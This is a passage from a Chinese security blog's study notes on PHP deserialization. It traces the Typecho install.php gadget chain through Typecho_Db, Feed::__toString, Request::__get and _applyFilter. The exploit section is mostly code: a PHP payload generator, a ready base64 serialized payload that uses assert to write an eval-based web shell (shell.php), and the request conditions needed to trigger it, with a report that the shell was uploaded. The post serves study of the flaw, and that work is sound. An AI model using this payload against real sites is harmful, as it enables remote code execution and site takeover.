    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapterName</span> <span class="token operator">=</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

    <span class="token comment">/** 数据库适配器 */</span>
    <span class="token variable">$adapterName</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Typecho_Db_Adapter_'</span> <span class="token punctuation">.</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'isAvailable'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db_Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Adapter <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$adapterName</span><span class="token punctuation">&#125;</span></span> is not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_prefix</span> <span class="token operator">=</span> <span class="token variable">$prefix</span><span class="token punctuation">;</span>

    <span class="token comment">/** 初始化内部变量 */</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_pool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_connectedPool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//实例化适配器对象</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$adapterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>查找<font color=purple><code>__toString()</code></font>魔术方法，发现在<font color=orange><code>\var\Typecho\Feed.php</code></font>中：若<font color=orange><code>$item[&#39;author&#39;]</code></font>中不存在<font color=orange><code>screenName</code></font>属性，则会触发item的<font color=purple><code>__get()</code></font>魔术方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;item>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;title>'</span> <span class="token punctuation">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/title>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;link>'</span> <span class="token punctuation">.</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/link>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;guid>'</span> <span class="token punctuation">.</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/guid>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;pubDate>'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dateFormat</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/pubDate>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;dc:creator>'</span> <span class="token punctuation">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'author'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">screenName</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/dc:creator>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>全局搜索魔术方法<font color=purple><code>__get()</code></font>后，在<font color=orange><code>\var\Typecho\Request.php</code></font>中找到该方法：在该方法中调用了<font color=orange><code>get()</code></font>方法，其中给传入的不存在的属性赋值并调用<font color=orange><code>_applyFilter()</code></font>方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token keyword">isset</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_httpParams</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_httpParams</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$value</span> <span class="token punctuation">:</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_applyFilter</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在<font color=orange><code>_applyFilter()</code></font>中，将根据<font color=orange><code>$value</code></font>是否为数组来调用<font color=orange><code>array_map()</code></font>或<font color=orange><code>call_user_func()</code></font>函数，而这两个函数便可以执行命令</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_applyFilter</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="3-3-复现流程"><a href="#3-3-复现流程" class="headerlink" title="3.3 复现流程"></a>3.3 复现流程</h4><p>经过上文的分析，整个流程也就清晰了：</p>
<ol>
<li>构造payload绕过并执行反序列化（需要base64编码）</li>
<li>payload需通过cookie或POST方式传入</li>
<li>payload中的<font color=orange><code>Config</code></font>属性传入<font color=orange><code>Typecho_Db</code></font>中，<font color=orange><code>Typecho_Db</code></font>会触发<font color=purple><code>__toString()</code></font>魔术方法</li>
<li>在<font color=purple><code>__toString()</code></font>魔术方法中再触发<font color=purple><code>__get()</code></font>魔术方法</li>
<li>最后利用<font color=purple><code>__get()</code></font>魔术方法中的函数调用<font color=orange><code>array_map()</code></font>或<font color=orange><code>call_user_func()</code></font>函数从而实现命令执行</li>
</ol>
<h4 id="3-4-payload构造（参考-5-）"><a href="#3-4-payload构造（参考-5-）" class="headerlink" title="3.4 payload构造（参考[5]）"></a>3.4 payload构造（参考[5]）</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$_type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ATOM 1.0'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_items</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'screenName'</span><span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'file_put_contents(\'shell.php\', \'&lt;?php @eval($_GET["shell"]);?>\')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$payload1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$payload2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$payload1</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'typecho_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjQ6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9HRVRbInNoZWxsIl0pOz8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
?></code></pre>

<p>构造并发送数据包，注意要满足<font color=orange><code>install.php</code></font>的要求：有<font color=orange><code>finish</code></font>参数和<font color=orange><code>HTTP_REFERER</code></font></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//判断是否已经安装</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'finish'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">__TYPECHO_ROOT_DIR__</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/config.inc.php'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'typecho'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$parts</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_HOST'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>构造请求如下：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201511.png" alt="image-20210430201358165" loading="lazy"></p>
<p>shell上传成功：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201504.png" alt="image-20210430201431734" loading="lazy"></p>
<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p>[1] [红日安全]Web安全Day15 - 反序列化实战攻防 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7023">https://xz.aliyun.com/t/7023</a></p>
<p>[2] PHP 魔术方法 - 简介 <a target="_blank" rel="noopener" href="https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-index.html">https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-index.html</a></p>
<p>[3] [BUUCTF-WEB] [网鼎杯 2020 青龙组]AreUSerialz <a target="_blank" rel="noopener" href="https://juejin.cn/post/6929123441257742350">https://juejin.cn/post/6929123441257742350</a></p>
<p>[4] AreUSerialz-[网鼎杯 2020 青龙组]-[传送门-＞BUUCTF] <a target="_blank" rel="noopener" href="https://www.secn.net/article/349246.html">https://www.secn.net/article/349246.html</a></p>
<p>[5] Typecho反序列化漏洞分析 <a target="_blank" rel="noopener" href="https://lanvnal.com/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/">https://lanvnal.com/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/</a></p>
<p>[6] 浅谈php反序列化漏洞 <a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p>[7] php反序列化漏洞 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/13709419.html">https://www.cnblogs.com/Lmg66/p/13709419.html</a></p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Echoram</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" title="反序列化漏洞学习笔记（一）—— 反序列化漏洞原理">http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/05/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/" rel="prev" title="反序列化漏洞学习笔记（二）—— 反序列化字符逃逸"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">反序列化漏洞学习笔记（二）—— 反序列化字符逃逸</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/12/23/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%A6%E8%A7%A3/" rel="next" title="注册表详解"><span class="post-nav-text">注册表详解</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>若您想及时得到回复提醒，建议使用邮箱联系博主呦~</span><br></div><div id="valine-container"></div><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function initValine() {
  const valineConfig = {"enable":true,"appId":"tgTIs6toa7rmkMnrsSTHEg1p-MdYXbMMI","appKey":"mA678OPlrWqFxom64uRzNBXL","placeholder":"请写下你宝贵的评论~","avatar":"monsterid","pageSize":10,"visitor":true,"highlight":true,"recordIP":false,"enableQQ":true,"meta":["nick","mail","link"],"lang":"zh-cn","Emoji See":"https://valine.js.org/emoji.html","el":"#valine-container"}
  valineConfig.path = window.location.pathname
  new Valine(valineConfig)
}
setTimeout(initValine, 800)</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2020 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Echoram</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.3.0</span></div><div class="live_time"><span>本博客已稳健运行</span><span id="display_live_time"></span><span class="moe-text">(~_~)</span><script>function blog_live_time() {
  window.setTimeout(blog_live_time, 1000);
  const start = new Date('2020-12-10T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="想要搜些什么？" value=""></div><div id="local-search-result"></div></div></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script></body></html>